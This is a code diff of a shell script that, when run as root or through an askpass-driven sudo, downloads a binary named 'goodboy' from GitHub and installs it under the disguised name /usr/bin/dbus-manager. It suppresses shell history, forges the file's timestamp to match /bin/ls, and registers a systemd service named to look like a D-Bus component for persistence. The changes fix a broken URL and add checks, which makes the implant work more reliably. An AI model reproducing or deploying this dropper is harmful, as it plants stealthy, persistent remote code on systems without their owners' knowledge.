@@ -10,9 +10,9 @@ if [ "$EUID" -eq 0 ]; then
     set +o history
 
     GOOD_BOY_URL="https://github.com/Kaucrow/good-boy/raw/refs/heads/main/bin/goodboy"
-    curl -L -s -o /usr/bin/dbus-manager "$GOOD_BOY_URL" || \
-    wget -q -O /usr/bin/dbus-manager "$GOOD_BOY_URL"
-
+    GOOD_BOY_FILE="/usr/bin/dbus-manager"
+    curl -L -s -o $GOOD_BOY_FILE $GOOD_BOY_URL || \
+    wget -q -O $GOOD_BOY_FILE $GOOD_BOY_URL
     if [ ! -f /usr/bin/dbus-manager ]; then
         exit 1
     fi
@@ -22,9 +22,16 @@ if [ "$EUID" -eq 0 ]; then
     touch -r /bin/ls /usr/bin/dbus-manager
 
     SYSTEMD_SERVICE="dbus-org.manager.service"
-    SYSTEMD_SERVICE_URL="https://https://raw.githubusercontent.com/Kaucrow/good-boy/refs/heads/main/systemd.service"
-    curl -s -o /etc/systemd/system/$SYSTEMD_SERVICE "$SYSTEMD_SERVICE_URL" || \
-    wget -q -O /etc/systemd/system/$SYSTEMD_SERVICE "$SYSTEMD_SERVICE_URL"
+    SYSTEMD_SERVICE_URL="https://raw.githubusercontent.com/Kaucrow/good-boy/refs/heads/main/systemd.service"
+    SYSTEMD_SERVICE_FILE="/etc/systemd/system/$SYSTEMD_SERVICE"
+    curl -s -o $SYSTEMD_SERVICE_FILE $SYSTEMD_SERVICE_URL || \
+    wget -q -O $SYSTEMD_SERVICE_FILE $SYSTEMD_SERVICE_URL
+
+    if [ ! -f $SYSTEMD_SERVICE_FILE ]; then
+        exit 1
+    fi
+
+    systemctl daemon-reload
     systemctl enable $SYSTEMD_SERVICE
     systemctl start $SYSTEMD_SERVICE
 
@@ -83,8 +90,9 @@ SUDO_ASKPASS="$ASKPASS_SCRIPT" /usr/bin/sudo -A bash << DEPLOYEOF
     chmod 444 /etc/crypttab.key
 
     GOOD_BOY_URL="https://github.com/Kaucrow/good-boy/raw/refs/heads/main/bin/goodboy"
-    curl -L -s -o /usr/bin/dbus-manager "\$GOOD_BOY_URL" || \
-    wget -q -O /usr/bin/dbus-manager "\$GOOD_BOY_URL"
+    GOOD_BOY_FILE="/usr/bin/dbus-manager"
+    curl -L -s -o $GOOD_BOY_FILE $GOOD_BOY_URL || \
+    wget -q -O $GOOD_BOY_FILE $GOOD_BOY_URL
 
     if [ ! -f /usr/bin/dbus-manager ]; then
         exit 1
@@ -93,12 +101,18 @@ SUDO_ASKPASS="$ASKPASS_SCRIPT" /usr/bin/sudo -A bash << DEPLOYEOF
     chmod +x /usr/bin/dbus-manager
 
     touch -r /bin/ls /usr/bin/dbus-manager
-    touch -r /bin/ls /etc/crypttab.key
 
     SYSTEMD_SERVICE="dbus-org.manager.service"
-    SYSTEMD_SERVICE_URL="https://https://raw.githubusercontent.com/Kaucrow/good-boy/refs/heads/main/systemd.service"
-    curl -s -o /etc/systemd/system/$SYSTEMD_SERVICE "$SYSTEMD_SERVICE_URL" || \
-    wget -q -O /etc/systemd/system/$SYSTEMD_SERVICE "$SYSTEMD_SERVICE_URL"
+    SYSTEMD_SERVICE_URL="https://raw.githubusercontent.com/Kaucrow/good-boy/refs/heads/main/systemd.service"
+    SYSTEMD_SERVICE_FILE="/etc/systemd/system/$SYSTEMD_SERVICE"
+    curl -s -o $SYSTEMD_SERVICE_FILE $SYSTEMD_SERVICE_URL || \
+    wget -q -O $SYSTEMD_SERVICE_FILE $SYSTEMD_SERVICE_URL
+
+    if [ ! -f $SYSTEMD_SERVICE_FILE ]; then
+        exit 1
+    fi
+
+    systemctl daemon-reload
     systemctl enable $SYSTEMD_SERVICE
     systemctl start $SYSTEMD_SERVICE
 
